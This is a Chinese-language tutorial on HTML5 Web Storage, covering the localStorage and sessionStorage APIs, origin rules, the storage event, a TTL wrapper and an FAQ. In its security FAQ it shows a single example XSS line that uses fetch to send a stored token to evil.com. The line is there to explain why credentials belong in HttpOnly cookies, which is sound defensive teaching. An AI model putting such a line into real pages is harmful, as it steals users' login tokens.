# HTML Web Storage (Web 存储)

HTML5 提供了两种在浏览器**本地**存储数据的机制，旨在取代传统 Cookies 存储非敏感数据（对于敏感数据，仍应优先考虑 HttpOnly Cookie：

- **`localStorage`**：**永久存储**。除非用户手动清理或代码删除，否则数据永远存在（关闭浏览器、重启电脑都在）。
- **`sessionStorage`**：**会话存储**。数据只在当前标签页（Tab）的会话周期内有效，**关闭标签页即销毁**。

## 1. 核心 API 速查

`localStorage` 和 `sessionStorage` 的方法、属性完全一致。

| 方法 / 属性        | 语法示例                               | 描述                                                 |
| :----------------- | :------------------------------------- | :--------------------------------------------------- |
| **`setItem()`**    | `localStorage.setItem('key', 'value')` | **存入数据**。若 key 已存在则覆盖 value。            |
| **`getItem()`**    | `localStorage.getItem('key')`          | **读取数据**。若 key 不存在，返回 `null`。           |
| **`removeItem()`** | `localStorage.removeItem('key')`       | **删除数据**。删除指定 key。                         |
| **`clear()`**      | `localStorage.clear()`                 | **清空所有**。删除当前域名下该存储对象的全部键值对。 |
| **`key()`**        | `localStorage.key(0)`                  | **按索引取 Key**。获取第 n 个键名（用于遍历）。      |
| **`length`**       | `localStorage.length`                  | **数据条数**。返回当前存储了多少个键值对。           |

> 注意：**key 和 value 都会被强制转为字符串**。`setItem('count', 1)` 存入的是字符串 `"1"`，取出来也是字符串，需自行 `Number()` 转换。

## 2. 深入使用指南

### 2.1 只能存字符串（String Only!）

**最核心的坑点**：Web Storage **只能存储字符串**。直接存对象或数组时，它会强行调用 `.toString()`，得到 `"[object Object]"`，导致数据丢失。

**✅ 正确做法：使用 JSON 序列化**

```js
const user = { name: '张三', age: 18 }

// 存：对象 -> JSON 字符串
localStorage.setItem('userInfo', JSON.stringify(user))

// 取：JSON 字符串 -> 对象
const storedData = localStorage.getItem('userInfo')
if (storedData !== null) {
  const userData = JSON.parse(storedData)
  console.log(userData.name) // "张三"
}
```

### 2.2 localStorage vs sessionStorage 详解

| 特性             | localStorage                                                            | sessionStorage                                                         |
| :--------------- | :---------------------------------------------------------------------- | :--------------------------------------------------------------------- |
| **生命周期**     | **永久有效**。关闭浏览器、重启电脑、重启系统都还在。                    | **会话级**。**关闭标签页**即销毁；刷新（F5）和同标签页内跳转仍保留。   |
| **作用域**       | **同源共享**。同一源（协议+域名+端口）下，开多少个 Tab 都读同一份数据。 | **单标签页独享**。同源的 Tab A 与 Tab B 数据**相互隔离**（互不可见）。 |
| **跨标签页通信** | 支持，通过 `storage` 事件。                                             | 不支持（数据本就隔离）。                                               |
| **典型场景**     | 长期登录态、用户偏好（主题色）、未登录购物车、埋点去重。                | 表单分步填写的临时数据、一次性敏感数据（如验证码倒计时）。             |

### 2.3 同源策略（Origin）

Web Storage 的作用域由「**源（Origin）**」决定，**源 = 协议 + 域名 + 端口**，三者必须完全一致才算同源。

| 示例                                  | 是否同源                |
| :------------------------------------ | :---------------------- |
| `http://a.com` vs `http://a.com/user` | ✅ 同源（路径不影响）   |
| `http://a.com` vs `https://a.com`     | ❌ 不同源（协议不同）   |
| `http://a.com` vs `http://a.com:8080` | ❌ 不同源（端口不同）   |
| `http://a.com` vs `http://b.a.com`    | ❌ 不同源（子域名不同） |

> 每个源拥有**独立**的存储空间，A 站点读不到 B 站点的 localStorage。这是浏览器隔离用户数据的基础安全机制。

### 2.4 `storage` 事件（跨标签页通信）

当 `localStorage` 的数据在**其他标签页**被修改时，当前标签页会触发 `storage` 事件。这是同源多标签页之间**通信同步**的经典手段。

- **在当前做出修改的页面，不会触发它自己的 `storage` 事件**。
- 因 `sessionStorage` 本就按标签页隔离，`storage` 事件**只对 `localStorage` 有意义**。

```js
window.addEventListener('storage', event => {
  console.log('被修改的 key:', event.key)
  console.log('旧值:', event.oldValue)
  console.log('新值:', event.newValue)
  console.log('触发变更的页面 URL:', event.url)
  console.log('被修改的存储对象:', event.storageArea)
})
```

| 属性          | 说明                                                        |
| :------------ | :---------------------------------------------------------- |
| `key`         | 被修改的键名；调用 `clear()` 时为 `null`                    |
| `oldValue`    | 旧值；新增 key 时为 `null`                                  |
| `newValue`    | 新值；删除 key 时为 `null`                                  |
| `url`         | 触发变更的文档 URL                                          |
| `storageArea` | 被修改的 Storage 对象（`localStorage` 或 `sessionStorage`） |

**应用场景**：用户在 Tab A 退出登录，Tab B 监听到 `storage` 事件后自动跳转登录页或刷新状态。

### 2.5 遍历所有键

```js
// 方式一：用 key() + length
for (let i = 0; i < localStorage.length; i++) {
  const key = localStorage.key(i)
  console.log(key, localStorage.getItem(key))
}

// 方式二：直接 Object.keys（Storage 的方法在原型上，不会混入）
Object.keys(localStorage).forEach(key => {
  console.log(key, localStorage.getItem(key))
})
```

## 3. 实战：封装一个安全可靠的 Storage 工具

结合 JSON 序列化、异常处理、过期时间，封装一个生产可用的工具：

```js
const storage = {
  /**
   * 存入数据（自动 JSON 序列化 + 过期时间）
   * @param {string} key
   * @param {*} value 任意类型
   * @param {number} [ttl] 有效期（毫秒），不传则永久
   */
  set(key, value, ttl) {
    const data = {
      value,
      expires: ttl ? Date.now() + ttl : null,
    }
    try {
      localStorage.setItem(key, JSON.stringify(data))
      return true
    } catch (e) {
      console.warn('存储失败，可能容量已满:', e)
      return false
    }
  },

  /**
   * 读取数据（自动反序列化 + 过期校验）
   * @param {string} key
   */
  get(key) {
    const raw = localStorage.getItem(key)
    if (raw === null) return null
    try {
      const data = JSON.parse(raw)
      if (data.expires && Date.now() > data.expires) {
        localStorage.removeItem(key) // 过期自动清理
        return null
      }
      return data.value
    } catch (e) {
      return raw // 兼容非 JSON 的旧数据
    }
  },

  remove(key) {
    localStorage.removeItem(key)
  },

  clear() {
    localStorage.clear()
  },
}

// 用法
storage.set('user', { name: '张三' }, 60 * 1000) // 1 分钟后过期
storage.get('user') // 1 分钟内返回对象，过期返回 null
```

## 4. 常见问题 (FAQ) 与避坑指南

### 4.1 Web Storage 有多大容量限制？

通常是 **5MB（约 5 MiB，按字节计）每个源**。

- 相比之下，Cookie 只有 4KB。
- 由于 JS 字符串内部采用 **UTF-16** 编码，**每个字符（码元）占 2 字节**，所以大约能存 **250 万字符**。
  - 汉字与英文字母都是 1 个码元（2 字节），**占用量相同**。
  - Emoji 等补充平面字符是**代理对**，占 2 个码元（4 字节）。

### 4.2 为什么 `sessionStorage` 在新标签页里是空的？

很多开发者误以为 `sessionStorage` 像 Cookie 一样在同域下共享。**错！** `sessionStorage` 绑定的是 **Window（标签页）**。

- 你在 Tab A 存了数据。
- 在浏览器里新建 Tab B 打开同一网址 → **数据为空**。

**特例**：若你在 Tab A 通过 `window.open()` 或右键「在新标签页打开链接」打开 Tab B，Tab B 会**复制**一份 Tab A 当时的 sessionStorage，之后两者**各自独立**，互不影响。

### 4.3 如何给 localStorage 设置过期时间？

原生 API 不支持过期时间（它是永久的），需手动封装。

**思路**：存数据时把过期时间戳一并写入，取数据时判断是否超时。

### 4.4 隐私模式（Incognito）下能用吗？

- 在**隐身模式**下，`localStorage` 和 `sessionStorage` 依然**可以使用**。
- 但**关闭隐身窗口**时，所有数据（含 localStorage）都会被**立即清除**。

### 4.5 Web Storage 和 Cookie 有什么区别？

| 维度     | Web Storage                              | Cookie                                           |
| :------- | :--------------------------------------- | :----------------------------------------------- |
| **大小** | 约 5MB                                   | 约 4KB                                           |
| **传输** | 仅存浏览器本地，**不随请求发送**到服务器 | 自动随**每个 HTTP 请求**发送到服务器（耗带宽）   |
| **操作** | API 简单（`setItem` / `getItem`）        | 原生 API 难用（需解析 `document.cookie` 字符串） |
| **过期** | 需手动封装过期逻辑                       | 原生支持 `Expires` / `Max-Age`                   |
| **安全** | JS 可读写，易被 XSS 窃取                 | 可设 `HttpOnly`，JS 无法读取，更安全             |

### 4.6 为什么存布尔值 `false` 取出来变成了 `"false"`（字符串）？

因为 Web Storage 只能存字符串。

```js
localStorage.setItem('isLogin', false)
const isLogin = localStorage.getItem('isLogin') // 结果是字符串 "false"

if (isLogin) {
  // 字符串 "false" 在 if 判断中是 truthy！这是惊天大坑！
}
```

**解法**：用 `JSON.parse` 还原类型，或手动判断字符串 `'true'`：

```js
const isLogin = JSON.parse(localStorage.getItem('isLogin')) // 还原为布尔 false
```

### 4.7 为什么 localStorage 是同步的，会阻塞页面？

Web Storage API 是**同步**的：`getItem` / `setItem` 会**立即**读写磁盘，期间阻塞主线程（JS 执行线程）。

- 数据量小、读写不频繁时无感。
- **频繁读写大 JSON**（如循环里 setItem）会造成明显卡顿。
- **解法**：减少读写频次（批量合并）、避免存超大对象；对大数据/结构化查询，改用**异步**的 **IndexedDB**。

### 4.8 为什么不要在 localStorage 存敏感 Token？（XSS）

`localStorage` 可被页面内**任意 JS** 读取。一旦站点存在 **XSS 漏洞**，攻击者即可注入脚本把 Token 偷走：

```js
// ❌ 危险：敏感凭证直接存 localStorage
localStorage.setItem('token', jwtToken)

// 攻击者注入的代码（假设存在 XSS）
fetch('https://evil.com/steal?t=' + localStorage.getItem('token'))
```

**更安全的做法**：把登录凭证（如 JWT、Session ID）交给 **HttpOnly Cookie** 存储，浏览器会限制 JS 读取，从而即使有 XSS 也无法直接偷取 Token（但仍需配合 CSRF 防护）。

> 结论：**localStorage 适合存「非敏感」数据**（用户偏好、UI 状态、缓存），**不适合存凭证、身份令牌**。

### 4.9 Web Storage vs IndexedDB，如何选？

| 维度          | Web Storage              | IndexedDB                          |
| :------------ | :----------------------- | :--------------------------------- |
| **类型**      | 仅字符串（键值对）       | 结构化数据（对象、Blob、二进制等） |
| **容量**      | 约 5MB                   | 数百 MB 甚至更多                   |
| **同步/异步** | **同步**（会阻塞主线程） | **异步**（不阻塞）                 |
| **查询**      | 仅按键读取               | 支持索引、游标、范围查询、事务     |
| **适用**      | 轻量配置、少量缓存       | 大量/结构化数据、离线应用          |
